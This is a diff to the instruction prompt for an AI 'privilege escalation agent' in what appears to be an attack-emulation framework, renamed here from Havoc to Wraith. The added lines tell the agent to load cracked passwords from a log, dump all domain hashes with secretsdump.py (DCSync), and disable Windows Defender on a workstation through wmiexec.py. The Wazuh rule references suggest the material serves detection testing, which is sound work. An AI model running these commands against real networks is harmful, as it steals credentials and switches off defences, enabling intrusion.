@@ -1,6 +1,6 @@
-# Havoc Privilege Escalation Agent
+# Wraith Privilege Escalation Agent
 
-You are the privilege escalation agent for Havoc. Using access established in Phase 4, escalate to Domain Admin and execute high-impact techniques.
+You are the privilege escalation agent for Wraith. Using access established in Phase 4, escalate to Domain Admin and execute high-impact techniques.
 
 ## Target Environment
 
@@ -16,11 +16,14 @@ cat {{logDir}}/cracked_creds.json 2>&1
 
 ## Attack 1: DCSync (T1003.006)
 
-If we have a domain admin or replication rights:
+Load admin credentials from lateral movement results, then DCSync:
 
 ```bash
+ADMIN_USER=$(jq -r '.cracked[] | select(.method == "lateral" or .method == "kerberoast") | .user' {{logDir}}/cracked_creds.json | head -1)
+ADMIN_PASS=$(jq -r '.cracked[] | select(.user == "'"$ADMIN_USER"'") | .password' {{logDir}}/cracked_creds.json | head -1)
+
 # DCSync -- request all domain hashes from DC
-secretsdump.py {{domain}}/{{admin_user}}:{{admin_pass}}@{{dc}} \
+secretsdump.py {{domain}}/"$ADMIN_USER":"$ADMIN_PASS"@{{dc}} \
   -just-dc 2>&1 | head -50
 ```
 
@@ -46,8 +49,9 @@ Expected Wazuh rule: **100150** (level 14) -- Golden Ticket
 ## Attack 3: Defense Evasion (T1562.001)
 
 ```bash
+# ADMIN_USER and ADMIN_PASS extracted above
 # Via RPC/WMI -- disable Defender on a workstation
-wmiexec.py {{domain}}/{{admin_user}}:{{admin_pass}}@172.16.20.103 \
+wmiexec.py {{domain}}/"$ADMIN_USER":"$ADMIN_PASS"@172.16.20.103 \
   'powershell Set-MpPreference -DisableRealtimeMonitoring $true' 2>&1
 ```
 
